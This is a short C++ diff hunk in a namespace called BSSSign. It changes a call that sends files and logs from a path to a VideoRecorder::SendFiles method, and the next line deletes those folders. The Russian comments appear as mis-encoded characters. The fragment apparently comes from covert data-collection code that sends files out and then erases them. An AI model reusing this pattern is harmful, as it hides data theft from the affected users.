@@ -88,7 +88,7 @@ namespace BSSSign
 		string *Path = (string*)aPath;
 
 		//Îòïğàâëÿåì ëîãè
-		VideoRecorderSendPath(Path->t_str(), NULL, NULL, 0);
+		VideoRecorder::SendFiles(*Path);
 
 		// Óäàëÿåì ôàéëû
 		DeleteFolders(Path->t_str());
